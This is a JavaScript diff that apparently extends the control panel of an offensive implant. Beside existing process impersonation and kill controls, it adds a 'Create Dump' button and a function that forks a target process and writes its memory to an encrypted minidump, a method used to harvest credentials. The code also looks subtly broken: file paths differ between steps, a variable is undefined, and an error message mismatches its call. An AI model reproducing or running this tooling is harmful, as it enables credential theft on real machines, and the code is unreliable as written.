@@ -897,6 +897,48 @@ async function impersonateProcess(pid, name){
     }
 }
 
+async function dumpProc(pid){
+    setStatusWindow(`Starting dump of proces pid = ${pid}.`, "begin");
+    const ntOpenProcessRet = await runModule(`NtOpenProcess 0x${pid.toString(16)} 0x1080`);
+    if(ntOpenProcessRet.message.retval == 0){
+        setStatusWindow(`NtOpenProcess of pid = 0x${pid.toString(16)} desired_access = 0x1080 succeded (Handle = ${ntOpenProcessRet.message.handle}).`, "append");
+        const ntCreateProcessEx = await runModule(`NtCreateProcessEx 0x0 ${ntOpenProcessRet.message.handle} 0x0`)
+        if(ntCreateProcessEx.message.retval == 0){
+            setStatusWindow(`NtCreateProcessEx succeeded handle = ${ntCreateProcessEx.message.process_handle}.`, "append");
+            const queryInformationProcess = await runModule(`NtQueryInformationProcess ${ntCreateProcessEx.message.process_handle} 0 48`);
+            if(queryInformationProcess.message.retval == 0){
+                setStatusWindow(`QueryInformationProcess succeded pid = ${queryInformationProcess.message.parsed.unique_process_id_hex}.`, "append");
+                const ntCreateFile = await runModule(`CreateFile z:\\dump.dmp 0xC0000000`);
+                if(ntCreateFile.message.retval == 0){
+                    setStatusWindow(`CreateFile succeded (Handle = ${ntCreateFile.message.handle}).`, "append");
+                    const miniDumpWriteDump = await runModule(`MiniDumpWriteDump ${ntCreateProcessEx.message.process_handle} ${queryInformationProcess.message.parsed.unique_process_id_hex} 0x${ntCreateFile.message.handle.toString(16)} 2`);
+                    if(miniDumpWriteDump.message.retval == 0){
+                        setStatusWindow(`MiniDumpWriteDump succeded.`, "append");
+                        await runModule(`encrypt c:\\dump.dmp`);
+                        const ntDelete = await runModule(`NtClose 0x${ntCreateFile.message.handle.toString(16)}`);
+                        
+                        setStatus(`${download.message.data}`);
+                    }
+                    else{
+                        setStatusWindow(`MiniDumpWriteDump failed.`, "append");
+                        const ntDelete = await runModule(`NtClose 0x${ntCreateFile.message.handle.toString(16)}`);
+                    }
+                    const deletef = await runModule(`delete c:\\dump.dmp`);
+                }
+                else{
+                    setStatusWindow(`CreateFile failed NTSTATUS = ${ntCreateFile.message.retval}.`, "append");
+                }
+            }
+        }
+        else{
+            setStatusWindow(`NtCreateProcessEx failed NTSTATUS = ${ntCreateProcessEx.message.retval}.`, "append");
+        }
+    }
+    else{
+        setStatusWindow(`NtOpenProcess of pid = 0x${pid.toString(16)} desired_access = 0x9000 failed (NTSTATUS = ${ntOpenProcessRet.message.retval}).`, "append");
+    }
+}
+
 async function fillProcessTable() {
     renderImpersonationToken();
     await renderThreadOwner();
@@ -954,6 +996,7 @@ async function fillProcessTable() {
                             <a href="#" class="btn-link process-manager-view-handles-link" data-pid="${pid}">Handles</a>
                             <button type="button" class="btn btn-danger process-manager-impersonate-btn" data-pid="${pid}" data-name="${name}">Impersonate</button>
                             <button type="button" class="btn btn-danger process-manager-kill-btn" data-pid="${pid}">Kill</button>
+                            <button type="button" class="btn btn-danger process-manager-dump-btn" data-pid="${pid}">Create Dump</button>
                         </div>
                     </td>
                 </tr>
@@ -1000,6 +1043,16 @@ async function fillProcessTable() {
                 const name = event.currentTarget.dataset.name;
 
                 await impersonateProcess(pid, name);
+            });
+        });
+
+        tableBody.querySelectorAll(".process-manager-dump-btn").forEach((button) => {
+            button.addEventListener("click", async (event) => {
+                event.preventDefault();
+
+                const pid = Number(event.currentTarget.dataset.pid);
+
+                await dumpProc(pid);
             });
         });
 
